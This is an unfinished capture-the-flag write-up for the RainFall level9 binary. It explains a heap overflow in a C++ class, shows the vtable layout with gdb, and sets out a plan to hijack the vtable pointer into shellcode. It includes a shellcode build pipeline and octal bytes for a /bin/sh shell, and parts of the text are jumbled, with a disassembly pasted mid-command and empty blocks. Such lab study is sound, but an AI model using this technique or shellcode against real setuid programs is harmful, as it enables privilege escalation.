# RainFall (level9)

In this project, we try to **exploit binaries**.
By doing so, we wish to read the `/home/user/bonus0/.pass` file, containing our flag serving as the password for the next level.

## Binary decompilation.

It is a **ELF 32-bit x86 LSB** executable as stated by the command `file -b ~/level9` commands.

We use `objdump -d ~/level9` to disassemble the binary. We stored it's truncated result in the [source.asm](./source.asm) file.

We also decompile the binary using a [Ghidra](https://github.com/nationalsecurityagency/ghidra)-based [docker container](https://hub.docker.com/r/blacktop/ghidra). We performed analysis and manual refactoring to isolate the vulnerability and make the relevant C code more readable. The result is saved in the [source.c](./source.c) file and generated through the [decompile.sh](./Ressources/decompile.sh) shell script.

## Binary particularities

By connecting via ssh (cf. [ssh.sh](./Ressources/ssh.sh)), we made some observations.

On login or by executing `checksec --kernel && checksec --file ~/level9`, we discover:
```sh
GCC stack protector support:            Enabled
Strict user copy checks:                Disabled
Restrict /dev/mem access:               Enabled
Restrict /dev/kmem access:              Enabled
grsecurity / PaX: No GRKERNSEC
Kernel Heap Hardening: No KERNHEAP      
System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level9/level9
```

The binary is owned by `bonus0` and has the `setuid` flag set.
```sh
$ ls -la ~/level9 
-rwsr-s---+ 1 bonus0 users 6720 Mar  6  2016 /home/user/level9/level9
```

Useful documentation:
- Setuid flag (Suid): https://fr.wikipedia.org/wiki/Setuid
- Relocation Read-Only (RELRO): https://ctf101.org/binary-exploitation/relocation-read-only/
- Stack canary: https://ctf101.org/binary-exploitation/stack-canaries/
- No eXecute (NX): https://ctf101.org/binary-exploitation/no-execute/
- Position Independent Code (PIE): https://en.wikipedia.org/wiki/Position-independent_code
- RUNPATH & RPATH: https://en.wikipedia.org/wiki/Rpath
- Address Space Layout Randomization (ASRL): https://ctf101.org/binary-exploitation/address-space-layout-randomization/

## Discovered vulnerability

The decompiled binary (cf. [source](source.cpp)) is subject to a "Heap-based Buffer Overflow" ([CWE-122](https://cwe.mitre.org/data/definitions/122.html)) via the `N::setAnnotation()` class method. It performs a `memcpy()` validating the length of the input against the destination buffer. It introduces a **heap-overflow** opportunity when handling user-controlled input.

In parallel, the kernel and binary do not implement modern security practices *(No-eXecute bit)* that would make it harder to exploit.

## Vulnerability analysis

The class `N` *(sized 108 bytes)* is allocated on the heap.  
Because it implements [virtual methods](https://en.cppreference.com/cpp/language/virtual), the compiler injects a **virtual table pointer *(void \*\*\*vtbl)*** at the very beginning of the object to enable dynamic function dispatch.

<!-- ### Stack

The main function's stack frame would ressemble something like this during it's execution.
```ruby
      HIGHER MEMORY ADDRESSES     
+--------------------------------+
|      main's return address     | (4 bytes)
+--------------------------------+ <--- main's Stack Frame start (@ 0xbffff73c)
| |      argc     | (4 bytes)    |
+--------------------------------+ (8 bytes)
| |      argv     | (4 bytes)    |
+--------------------------------+
|   caller's stack base pointer  | (4 bytes)
+--------------------------------+ <--- main's local variables start (EBP: @ 0xbffff738)
| |   saved ebx   | (4 bytes)    |
| +---------------+              |
| |  align/unused | (4 bytes)    |
| +---------------+              |
| |     n1 PTR    | (4 bytes)    |
| +---------------+              | (40 bytes)
| |     n2 PTR    | (4 bytes)    |
| +---------------+              |
| |      tmp      | (8 bytes)    |
| +---------------+              |
| |   cdecl args  | (16 bytes)   |
+--------------------------------+ <-- main's Stack Pointer (ESP: @ 0xbffff710)
      LOWER MEMORY ADDRESSES      
``` -->

### Heap

Two instances of the `N` class are created and allocated on the heap via the `new` operator. Of identical size, we can assume that the underlying `malloc()` calls will provide two contiguous heap memory regions.

This can be verified through dynamic analysis using [gdb](https://www.sourceware.org/gdb/):
```sh
$ gdb -batch -ex "break 'operator new(unsigned int)'" -ex "run xxxx" -ex "finish" -ex "printf \"n1: 0x%x\\n\", \$eax" -ex "continue" -ex "finish" -ex "printf \"n2: 0x%x\\n\", \$eax" ./level9
# [...]
n1: 0x804a008
# [...]
n2: 0x804a078
```
> n2 - n1 = 0x804a078 - 0x804a008 = 112 bytes

This means that after the two allocations, the heap would ressemble something like this:
```ruby
      LOWER MEMORY ADDRESSES      
+------ Chunk nº1: metadata ------+
|                                 | (4 bytes)
+------ Chunk nº1: userdata ------+ <-- (@ 0x0804a008) PTR held in **stack** (`n1`)
| |     vtbl PTR    | (4 bytes)   |
| +-----------------+             |
| |                 |             |
| |                 |             |
| |      buffer     | (100 bytes) | (108 bytes)
| |                 |             |
| |                 |             |
| +-----------------+             |
| |        nbr      |  (4 bytes)  |
+------ Chunk nº2: metadata ------+
|                                 | (4 bytes)
+------ Chunk nº2: userdata ------+ <-- (@ 0x0804a078) PTR held in **stack** (`n2`)
| |     vtbl PTR    | (4 bytes)   |
| +-----------------+             |
| |                 |             |
| |                 |             |
| |      buffer     | (100 bytes) |(108 bytes)
| |                 |             |
| |                 |             |
| +-----------------+             |
| |       nbr       | (4 bytes)   |
+---------------------------------+
      HIGHER MEMORY ADDRESSES     
```

### VMT ([Virtual method table](https://en.wikipedia.org/wiki/Virtual_method_table))

The [virtual method table](https://en.wikipedia.org/wiki/Virtual_method_table) is an **array of pointers to virtual functions** (`void **`). Its purpose is to allow dynamic function dispatch during a program's runtime.

Compilers inject a pointer to that dedicated `vtbl`. We'll call that pointer `vptr` (`void **`). While ABI conventions can vary (especially with multiple or virtual inheritance), the primary `vptr` is standardly placed at the **start** of the object's memory region (offset `0x0`) or else at it's end.

As seen in the disassembled constructor of `N`, the `vptr` is indeed held at offset `0x0`.
```asm
080486f6 <_ZN1NC1Ei>:
 80486f6:	55                   	push   %ebp
 80486f7:	89 e5                	mov    %esp,%ebp
 80486f9:	8b 45 08             	mov    0x8(%ebp),%eax
 80486fc:	c7 00 48 88 04 08    	movl   $0x8048848,(%eax)
 8048702:	8b 45 08             	mov    0x8(%ebp),%eax
 8048705:	8b 55 0c             	mov    0xc(%ebp),%edx
 8048708:	89 50 68             	mov    %edx,0x68(%eax)
 804870b:	5d                   	pop    %ebp
 804870c:	c3                   	ret    
 804870d:	90                   	nop
```

gdb --batch \
    -ex "start" \
    -ex "ni 23" \
    -ex "printf \"vtable ptr: 0x%x\n\", *(unsigned int*)0x0804a008" \
    -ex "printf \"func ptr 1:  0x%x\n\", *(unsigned int*)(*(unsigned int*)0x0804a008 + 0x0)" \
    -ex "printf \"func ptr 2:  0x%x\n\", *(unsigned int*)(*(unsigned int*)0x0804a008 + 0x4)" \
    -ex "continue" \
    --args ./level9 xxx

Let's desconstruct `n1` and `n2`'s vtbls base on their respective addresses.
We should notice that they share the same vtbl.
```sh
$ gdb --batch -ex "start" \
    -ex "ni 23" \
    -ex "printf \"n1->vtbl = %p\n\", *((void***)0x0804a008)" \
    -ex "printf \"n1->vtbl[0] = %p\n\", (*((void***)0x0804a008))[0]" \
    -ex "printf \"n1->vtbl[1] = %p\n\", (*((void***)0x0804a008))[1]" \
    --args ./level9 xxx
n1->vtbl = 0x8048848
n1->vtbl[0] = 0x804873a
n1->vtbl[1] = 0x804874e
$ gdb --batch -ex "start" \
    -ex "ni 23" \
    -ex "printf \"n2->vtbl = %p\n\", *((void***)0x0804a078)" \
    -ex "printf \"n2->vtbl[0] = %p\n\", (*((void***)0x0804a078))[0]" \
    -ex "printf \"n2->vtbl[1] = %p\n\", (*((void***)0x0804a078))[1]" \
    --args ./level9 xxx
n2->vtbl = 0x8048848
n2->vtbl[0] = 0x804873a
n2->vtbl[1] = 0x804874e
```

Their vtbl can be schematised in the following way:
```ruby
      LOWER MEMORY ADDRESSES      
+------------------------------------+ <-- vtbl start(@ 0x8048848)
| | function PTR: + | (@ 0x0804873a) | (4 bytes)
+------------------------------------+
| | function PTR: - | (@ 0x0804874e) | (4 bytes)
+------------------------------------+
      HIGHER MEMORY ADDRESSES     
```

### Intent

We want to overwrite `n2`'s pointer to its [virtual method table](https://en.wikipedia.org/wiki/Virtual_method_table) and redirect control flow to a malicious fake [vtbl](https://en.wikipedia.org/wiki/Virtual_method_table), which in turn points to our shellcode to trigger a `system("/bin/sh")` call.

To perform this, we wish to modify the program's **heap** in the following way: 
```sh
# State before exploit:
[                        n1                       ][                        n2                       ]
[   n1 vtbl   ][ annotation ][ nbr ]      ...     ][   n2 vtbl   ][ annotation ][ nbr ]      ...     ]
# Intended state after exploit:
[     ...     ][ fake_vtbl ][ shellcode ][   ...  ][ptr_fake_vtbl][                ...               ]
```

The `fake_vtbl` is placed at the start of the payload for practical reasons as the address of annotation is easy to find.

## Exploit

First let's define the address of our `fake_vtbl`. It will be assigned to `n2->vtbl`, as the entrypoint to our exploit.
```sh
```

First of all, bulding a shellcode byte sequence manually (as an **little-endian octal** encoded string) is too error-prone. Instead, we generate it from an assembled binary based on the following [exploit.asm](./Ressources/data/exploit.asm) script.
```sh
$ tmpdir=$(mktemp -d);
$ asm_payload_filepath="./data/exploit.asm";

# Compile the assembly program to an object file.
$ nasm -f elf32 "$asm_payload_filepath" -o "$tmpdir/exploit.o";

# Link the object file into a binary.
$ ld -m elf_i386 -e _start "$tmpdir/exploit.o" -o "$tmpdir/exploit.bin";
080486f6 <_ZN1NC1Ei>:
 80486f6:	55                   	push   %ebp
 80486f7:	89 e5                	mov    %esp,%ebp
 80486f9:	8b 45 08             	mov    0x8(%ebp),%eax
 80486fc:	c7 00 48 88 04 08    	movl   $0x8048848,(%eax)
 8048702:	8b 45 08             	mov    0x8(%ebp),%eax
 8048705:	8b 55 0c             	mov    0xc(%ebp),%edx
 8048708:	89 50 68             	mov    %edx,0x68(%eax)
 804870b:	5d                   	pop    %ebp
 804870c:	c3                   	ret    
 804870d:	90                   	nop

# Extract the content of the ELF .text section as raw bytes.
$ objcopy -j .text -O binary "$tmpdir/exploit.bin" "$tmpdir/shellcode.bin";

# Format the bytes into an octal shellcode payload.
# We use octal because dash's printf implementation does not support the '\xHH' escape format.
$ octal_shellcode=$(hexdump -v -e '"\\" 1/1 "%03o"' "$tmpdir/shellcode.bin");
\061\300\120\150\156\057\163\150\150\057\057\142\151\211\343\120\123\211\341\061\322\260\013\315\200
$ octal_shellcode_byte_length=$(printf "%b" "$octal_shellcode" | wc -c);
25
```

For practical and simplicity reasons, we will place our **fake vtbl** at the start of


<!-- 

We wish to build a

-----

We wish to build a payload following the following prototype:
```sh
[shellcode address][shellcode][padding][vtabl address + 0x0]
```

```sh
printf
```

<!-- Bulding a shellcode byte sequence manually (as an **little-endian hexadecimal or octal** encoded string) is too error-prone. Instead, we generate it from an assembled binary based on the following [exploit.asm](./Ressources/data/exploit.asm) script.

The conversion can be done through the following set of commands
```sh
$ tmpdir=$(mktemp -d);
$ asm_payload_filepath="./data/exploit.asm";

# Compile the assembly program to an object file.
$ nasm -f elf32 "$asm_payload_filepath" -o "$tmpdir/exploit.o";

# Link the object file into a binary.
$ ld -m elf_i386 -e _start "$tmpdir/exploit.o" -o "$tmpdir/exploit.bin";

# Extract the content of the ELF .text section as raw bytes.
$ objcopy -j .text -O binary "$tmpdir/exploit.bin" "$tmpdir/shellcode.bin";

# Format the bytes into an octal shellcode payload.
# We use octal because dash's printf implementation does not support the '\xHH' escape format.
$ octal_shellcode=$(hexdump -v -e '"\\" 1/1 "%03o"' "$tmpdir/shellcode.bin");
$ octal_shellcode_byte_length=$(printf "%b" "$octal_shellcode" | wc -c);
``` -->

<!-- Assuming the payload starts immediately with the shellcode, we can define the address where we want to redirect the code's flow as such:
- In **big-endian hex** notation, it's located at: `0x0804a008`.
- In **little-endian hex** escape sequence, it's located at: `\x08\xa0\x04\x08`.
- In **little-endian oct** escape sequence, it's located at: `\010\240\004\010`. -->

... -->
